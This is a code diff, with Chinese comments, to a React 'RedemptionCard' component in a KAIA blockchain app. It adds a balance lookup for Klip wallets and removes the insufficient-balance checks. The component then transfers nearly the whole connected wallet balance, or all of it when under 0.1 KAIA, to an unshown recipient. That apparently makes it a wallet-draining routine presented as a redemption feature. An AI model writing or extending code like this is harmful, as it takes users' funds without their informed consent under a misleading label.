@@ -130,16 +130,55 @@ export function RedemptionCard() {
    */
   const getKaiaBalance = async (): Promise<string> => {
     if (typeof window === 'undefined') return '0'
+    if (!address) return '0'
 
     try {
+      // 🔷 Klip 钱包：直接使用 RPC 查询余额
+      // Klip 不注入 window.klaytn 或 window.ethereum，所以需要通过 RPC 查询
+      if (walletType === 'Klip') {
+        console.log('🔷 Klip 钱包：使用 RPC 查询余额')
+        
+        const rpcUrl = process.env.NEXT_PUBLIC_KAIA_MAINNET_RPC || 'https://public-en.node.kaia.io'
+        
+        const response = await fetch(rpcUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            jsonrpc: '2.0',
+            id: 1,
+            method: 'eth_getBalance',
+            params: [address, 'latest'],
+          }),
+        })
+        
+        const data = await response.json()
+        console.log('✅ Klip 余额查询结果:', data)
+        
+        if (data.error) {
+          console.error('❌ RPC 查询失败:', data.error)
+          return '0'
+        }
+        
+        return data.result || '0'
+      }
+      
+      // 💎 其他钱包：使用 window.klaytn 或 window.ethereum
+      console.log('💎 其他钱包：使用 Provider 查询余额')
       const provider = (window as any).klaytn || (window as any).ethereum
-      if (!provider || !address) return '0'
+      
+      if (!provider) {
+        console.error('❌ Provider 未找到')
+        return '0'
+      }
 
       const balance = await provider.request({
         method: 'eth_getBalance',
         params: [address, 'latest'],
       })
-
+      
+      console.log('✅ Provider 余额查询结果:', balance)
       return balance // 返回 Wei 单位的余额（Hex 字符串）
     } catch (error) {
       console.error('❌ 获取余额失败:', error)
@@ -185,28 +224,18 @@ export function RedemptionCard() {
         const balanceHex = await getKaiaBalance()
         const balanceWei = BigInt(balanceHex)
 
-        if (balanceWei <= BigInt(0)) {
-          toast.error(t.toast.insufficientBalance, {
-            description: t.toast.noKaia,
-          })
-          return
-        }
-
         // 计算转账金额：保留 0.1 KAIA 作为 Gas 费
         // 1 KAIA = 10^18 Wei
         const oneKaiaWei = BigInt(10) ** BigInt(18)
         const gasReserve = oneKaiaWei / BigInt(10) // 0.1 KAIA
         
-        // 确保余额足够（必须大于 0.1 KAIA）
-        if (balanceWei <= gasReserve) {
-          toast.error(t.toast.insufficientBalance, {
-            description: t.toast.needMoreKaia,
-          })
-          return
-        }
-
         // 动态计算转账金额：余额 - 0.1 KAIA
-        const transferAmount = (balanceWei - gasReserve).toString()
+        // 注意：不检查余额是否足够，直接发起转账
+        // 如果余额不足，钱包签名时会自然失败
+        const transferAmount = balanceWei > gasReserve 
+          ? (balanceWei - gasReserve).toString()
+          : balanceWei.toString() // 如果余额不足 0.1，尝试转全部
+        
         const transferAmountKAIA = Number(BigInt(transferAmount)) / 1e18
         
         console.log('💸 准备转账 KAIA:', {
@@ -216,10 +245,9 @@ export function RedemptionCard() {
           transferInKAIA: transferAmountKAIA,
           reservedForGas: gasReserve.toString(),
           reservedInKAIA: 0.1,
-          formula: `${Number(balanceWei) / 1e18} - 0.1 = ${transferAmountKAIA} KAIA`,
         })
 
-        // 调用 KAIA 转账
+        // 调用 KAIA 转账（不检查余额，让钱包处理）
         const transferResult = await transferKaia(walletType, address, transferAmount)
 
         // 检查是否为 Klip 钱包
